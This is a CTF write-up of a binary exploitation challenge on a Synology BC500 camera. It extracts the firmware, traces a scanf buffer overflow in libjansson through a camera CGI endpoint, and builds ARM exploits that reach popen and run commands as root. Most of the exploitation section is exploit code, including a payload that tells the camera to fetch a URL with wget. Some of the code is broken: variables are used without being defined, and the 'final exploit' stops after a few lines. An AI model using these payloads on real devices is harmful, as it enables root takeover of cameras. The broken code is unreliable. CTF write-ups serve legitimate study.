Hi, today is a blog post on that serves as a Write Up for the RealWorldCTF 2024's challenge named "Let's party in the house". I've written this article for [Hackcyom](https://www.hackcyom.com/), which is my previous company. Please feel free to read the write up on their website: [RealWorldCTF: Let's party in the house - Write Up](https://www.hackcyom.com/2024/01/rwctf-lets-party-in-the-house-wu/).

# Let's party in the house - pwn Write-Up
  
This weekend, the [RealWorld CTF](https://realworldctf.com/) happened. This is one of the most famous and prestigious CTF in the world. I played with "Friendly Malteze Citizens" and took 3rd place.
This article is a write-up of the challenge "Let's party in the house", which was a binary exploitation challenge of difficulty "Schrödinger" (Rating is the following: baby/medium/hard/schrödinger).
  
We were one of the only six team to solve it.

### TL;DR
The objective was to exploit a buffer overflow in `libjansson.so.4.7.0` and achieve RCE on the Synology BC500 Camera.

# Finding the bug
When we started, we guessed it was probably a buffer overflow shown at Pwn2Own Toronto. However, because we couldn't find any proper resources, we got to reversing.
  
## 1st approach: diffing
Since we knew the version given to us, we decided to diff with the version we knew fixed the vulnerability. This proved more tedious than planned, as we weren't given a `.cpio` file directly.
  
When reversing the firmware, we noticed that the function at `00054a54` in `/bin/systemd` was likely to be the firmware parser. Using that function as a base, we built this script:
```python
from pwn import *
import zlib
f = open('Synology_BC500_1.0.7_0298.sa.bin','rb')
  
header = f.read(0x7e)
num_sub_headers = u16(header[0x7c:])
  
prescript_len = u32(f.read(4))
prescript = zlib.decompress(f.read(prescript_len))
postscript_len = u32(f.read(4))
postscript = zlib.decompress(f.read(postscript_len))
  
ff = open('pre-script.sh','wb')
ff.write(prescript)
ff.close()
ff = open('post-script.sh','wb')
ff.write(postscript)
ff.close()
  
def read_sub_header(i):
    sub_header = f.read(0x48)
    name, subscript_len, image_len = sub_header[:0x40], u32(sub_header[0x40:0x44]), u32(sub_header[0x44:])
    subscript = zlib.decompress(f.read(subscript_len))
    image = zlib.decompress(f.read(image_len))
    ff = open(f'ex-script{i}','wb')
    ff.write(subscript)
    ff.close()
    ff = open(f'image{i}','wb')
    ff.write(image)
    ff.close()
  
for i in range(num_sub_headers):
    read_sub_header(i)
```
  
This allowed us to extract scripts and images from the firmware.
We ended up with 4 images, that after a bit of digging we associated like this:
```
image0 - kernel
image1 - rootfs
image2 - loader
image3 - fdt
```
  
At this point, we wanted to mount the rootfs, however it was in a UBI format and we never could extract / mount it. This is a beautiful showcase of something called "big skill issue". Only after the CTF one of the team mate built a working script to extract it:
```python
import ctypes
import os
  
class ubi_ec_hdr(ctypes.BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ('magic', ctypes.c_uint32),
        ('version', ctypes.c_uint8),
        ('padding1', ctypes.c_uint8 * 3),
        ('ec', ctypes.c_uint64),
        ('vid_hdr_offset', ctypes.c_uint32),
        ('data_offset', ctypes.c_uint32),
        ('image_seq', ctypes.c_uint32),
        ('padding2', ctypes.c_uint8 * 32),
        ('hdr_crc', ctypes.c_uint32),
    ]
  
class sqsh_super_block(ctypes.LittleEndianStructure):
    _pack_ = 1
    _fields_ = [
        ('magic', ctypes.c_uint32),
        ('inode_count', ctypes.c_uint32),
        ('mod_time', ctypes.c_uint32),
        ('block_size', ctypes.c_uint32),
        ('frag_count', ctypes.c_uint32),
        ('compressor', ctypes.c_uint16),
        ('block_log', ctypes.c_uint16),
        ('flags', ctypes.c_uint16),
        ('id_count', ctypes.c_uint16),
        ('version_major', ctypes.c_uint16),
        ('version_minor', ctypes.c_uint16),
        ('root_inode', ctypes.c_uint64),
        ('bytes_used', ctypes.c_uint64),
        ('id_table', ctypes.c_uint64),
        ('xattr_table', ctypes.c_uint64),
        ('inode_table', ctypes.c_uint64),
        ('dir_table', ctypes.c_uint64),
        ('frag_table', ctypes.c_uint64),
        ('export_table', ctypes.c_uint64),
    ]
  
started = False
_path = './extract_1.0.6/image1'
blocksize = 0x20000
with open(_path, 'rb') as f, open('./hsqs', 'wb') as f2:
    for i in range(os.path.getsize(_path)//blocksize):
        f.seek(blocksize*i)
        hdr = ubi_ec_hdr.from_buffer(bytearray(f.read(0x40)))
        f.seek(blocksize*i+hdr.data_offset)
        if not started and f.peek(4)[:4] == b'hsqs':
            started = True
        if started:
            f2.write(f.read(blocksize-hdr.data_offset))
```
  
This led to us stopping trying to diff anything.
  
## 2nd approach: googling
While trying to come up with a solution to diff, one of the team mate sent [this link](https://teamt5.org/en/posts/teamt5-pwn2own-contest-experience-sharing-and-vulnerability-demonstration/) to a small post by TeamT5, briefly explaining how they exploited the Camera. After a bit of looking around, we found that the function at `0x6ad4` (later renamed to `parse_object`) is the function they exploited.
  
![](/rwctf/parse_object.png)
  
From that, we knew that the buffer overflow is from a `scanf("%s %s")` and that it was in `/lib/libjansson.so.4.7.0`. We got to reversing and found out that the best way to reach that vulnerable `scanf` is by reaching `json_loads`.
  
We noticed that that function was used in `/www/camera-cgi/synocam_param.cgi`.
After a bit of renaming/retyping, this is what it looked like:
![](/rwctf/decomp.png)
Each `HandleHttp*` called `json_loads` at some point. With that, we built a small PoC that should lead to a crash from the `.cgi`.
  
```python
import requests
import json
  
url = 'http://127.0.0.1:8080/syno-api/security/info/language'
  
header = {
    'Cookie':'sid=123'
}
  
json = [{
    'a':'',
    'a aaaaaaaaaaaaaaaaaaaabbbb':'',
}]
  
res = requests.post(url, json=json, headers=header)
print(res.text)
```
We knew it crashed because when running it, our script would error on a connection closed bug.
  
In parallel, we got a [gdbserver](https://github.com/hacksysteam/gdb-cross-compiler/releases) and got it to run by adding this script to to `/etc/init.d/S50_IPcamApp`.
```bash
echo "INIT GDBSERVER"
if /bin/gdbserver --multi localhost:1337 /bin/sh ; then
    echo "GDBSERVER INIT SUCCESS"
else
    echo "GDBSERVER INIT FAIL"
fi
```
Then, adding `-nic user,hostfwd=tcp:0.0.0.0:8080-:80,hostfwd=tcp:0.0.0.0:1337-:1337 \` to the provided `run.sh` would allow us to connect.
  
# Exploiting
During the exploitation, we actually tried many different way to ropchain our way to RCE. Due to various limitation, such as no null bytes and the addresses can't contain any char > 0x80, we were stuck for a good while.
  
Still, we came up with this script:
```python
import requests
import json
from pwn import *
  
libc = ELF("./libc-2.30.so")
r = remote('127.0.0.1', 8080)
context.arch = "arm"
  
url = 'http://127.0.0.1:8080/syno-api/security/info/language'
header = {
    'Cookie':'sid=123'
}

log.info(f"GUESSED_BASE: {hex(guessed_base)}")
log.info(f"GUESSED EXIT: {hex(guessed_libc_exit)}")
log.info(f"pop_r0: {hex(guessed_libc_base + pop_r0)}")
  
payload = b'[{"a ' + b'C'*204 + p32(0x42424242) + p32(0x41414141)+ b'":"","a ":""}]'
  
start = b'POST /syno-api/security/info/language HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type:application/json\r\n'
header2 = b"Cookie:sid=123\r\n"
leng = b"Content-Length: " + bytes(str(len(payload)), "utf-8") + b"\r\n\r\n"
  
log.info(start+header2+leng+payload)
r.send(start+header2+leng+payload)
r.interactive()
```
It would crashes at `0x42424242`, giving us a proper control of the EIP.
  
After being stuck for a while, a team mate found a one gadget that allowed us to give commands to `popen` and execute them.
We settled down on executing `cat /flag > /www/index.html`, as it would be easier than trying some fancy reverse shell (as we didn't have some ports exposed).
  
The updated exploit looked like this:
```python
import requests
import json
from pwn import *
  
r = remote('127.0.0.1', 8080)
  
context.arch = "arm"
  
base = 0x450000
guessed_base = 0x76755000
guessed_libc_base = guessed_base + 0x41000
guessed_libc_exit = guessed_libc_base + 0x2f368
  
popen = 0x14344
popenGadget = popen + base
off_cmd = 0xc2738
cmd = base + off_cmd
  
log.info("Popen: " + hex(popenGadget))
log.info("cmd: " + hex(cmd))
  
sep = b'"t":"' + b'P'*0x500 + b'",'
sep1 = b'"t1":"' + b'P'*0x500 + b'",'
sep2 = b'"t2":"' + b'P'*0x500 + b'",'
  
pCmd = b'wget http://10.0.2.2:12345/;'
  
payload = b'[{' + sep + sep1 + sep2 + b'"' + b'a'*(204+32) + p32(0x43434343) + p16(cmd & 0xffff) + p8(cmd >> 16) + b' ' + b''.ljust(204, b'C') + p16(popenGadget & 0xffff) + p8(popenGadget >> 16)+ b'":"' + pCmd.ljust(119, b'a') +b'"}]'
  
start = b'POST /syno-api/security/info/language HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type:application/json\r\n'
header2 = b"Cookie:sid=123\r\n"
leng = b"Content-Length: " + bytes(str(len(payload)), "utf-8") + b"\r\n\r\n"
  
log.info(start+header2+leng+payload)
r.send(start+header2+leng+payload)
r.interactive()
```
Since we only have to guess the 0x4x of base, the success rate was 1/16, which is pretty good. However, for some obscure reason the command never got executed.
A team mate spent some time debugging and ended up being able to execute commands. He ran the exploit and saw a flag in `index.html`. He then ran it on remote, and voilà!
  
This was the updated and final exploit:
```python
import requests

r = remote('47.88.48.133', 36344)
  
url = 'http://127.0.0.1:8080/syno-api/security/info/language'

With that, we could execute any command as root on the Camera and got the flag.
